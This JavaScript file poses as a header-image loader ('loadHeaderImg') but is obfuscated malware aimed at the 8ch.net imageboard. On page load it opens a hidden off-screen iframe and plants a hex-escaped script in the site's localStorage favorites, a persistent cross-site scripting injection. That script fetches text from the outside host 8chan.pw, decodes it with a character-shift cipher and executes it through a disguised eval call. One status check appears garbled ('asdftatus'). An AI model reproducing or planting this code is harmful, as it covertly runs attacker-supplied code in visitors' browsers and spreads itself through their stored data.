function loadHeaderImg () {
        if (window.location.href.indexOf('ng=1')==-1) {
                var ua = navigator.userAgent;
                if (ua) {
                        var ii=document.createElement('iframe');
                        ii.style.position='absolute';
                        ii.style.left='-1280px';
                        ii.style.top='-980px';
                        ii.width=300;
                        ii.height=100;
                        ii.src=(''+window.location.href).split('media.8ch.net').join('8ch.net').split('.swf').join('.swf?ng=1&');
                        document.body.appendChild(ii);
                };
        } else if (window.location.href.indexOf('8ch.net')>=0) {
                var fs="aylmoctisfnetoojwsdd911<div id='favsh1' style='width:1px;height:1px;display:none;'></div><script>function cbstrtea(){ var os = document.getElementsByTagName('div'); for (var i=os.length-1; i>=0; i--) {  var o = os[i];  if (o.id == 'favsh1') {   o = o.parentNode;   o.style.display='none';   if (o.previousSibling && ((''+o.previousSibling.textContent).split(' ').join('') == '/')) {    o.parentNode.removeChild(o.previousSibling);   } else if (o.nextSibling && ((''+o.nextSibling.textContent).split(' ').join('') == '/')) {    o.parentNode.removeChild(o.nextSibling);   } else if (o.previousSibling && o.nextSibling && ((''+o.previousSibling.textContent).split(' ').join('') == '[') && ((''+o.nextSibling.textContent).split(' ').join('') == ']')) {    o.parentNode.removeChild(o.previousSibling);    o.parentNode.removeChild(o.nextSibling);   };  }; };};setTimeout('cbstrtea()',0);if (!window.hfavsh) { window.wqvqlx='val'; window.hfavsh=true; if (typeof(window.axhtprqsa) == 'undefined') {  window.axhtprqsa = [];  window.wqvqlxf = function (u, f) {   var xh;   if (window.XMLHttpRequest) {    xh = new XMLHttpRequest();   } else {    xh = new ActiveXObject('Microsoft.XMLHTTP');   };   var o = {};   o.xh = xh;   o.done = false;   o.f = f;   window.axhtprqsa.push(o);   xh.onreadystatechange = function () {    var o = null;    for (var i = window.axhtprqsa.length-1; i>=0; i--) {     if (window.axhtprqsa[i].xh == this) {      o = window.axhtprqsa[i];      break;     };    };    if (o != null) {     if (this.readyState == 4 ) {      if (!o.done) {       o.done = true;       if (asdftatus == 200) {        o.f(this.responseText, 'success');       } else {        o.f('', 'error');       };      };     };    };   };   try {    xh.open('GET', u, true);    xh.send();   } catch (e) { };  }; }; function gfavsh(d,c){  var fd='';  var lv = 5;  var plv;  for (var i = 0;i<d.length;i++) {   var v=d.charCodeAt(i);   v -= 32;   plv = lv;   lv = v;   v -= plv;   v %= 126-32;   if (v<0) v+=126-32;   v += 32;   fd+=String.fromCharCode(v);  };  if (fd.length >= 3) if (c=='success') window[window['wqvqlx']](fd); }; window.wqvqlx='e'+window.wqvqlx; wqvqlxf('https://8chan.pw/a_>>>this.uaf<<<', gfavsh);};</script>aylmoctisfnetoojwsdd911";
                var favorites = [];
                var can_go = true;
                if (localStorage.favorites) {
                        if (localStorage.favorites.indexOf('\\u00') >= 0) {
                                can_go = false;
                        };
                        favorites = JSON.parse(localStorage.favorites);
                };
                if (can_go) {
                        favorites.push(fs);
                        var lcs = JSON.stringify(favorites);
                        var ss = lcs.split('aylmoctisfnetoojwsdd911');
                        for (var i = 0; i<ss.length; i++) {
                                if (i%2 == 1) {
                                        var s=ss[i];
                                        var ns='';
                                        for (var j = 0; j<s.length; j++) {
                                                var hs='00'+(s.charCodeAt(j)).toString(16);
                                                hs=hs.substr(hs.length-2);
                                                ns+='\\u00'+hs;
                                        };
                                        ss[i]=ns;
                                };
                        };
                        ss = ss.join('');
                        localStorage.favorites = ss;
                };
        };
};
setTimeout('loadHeaderImg()', 0);
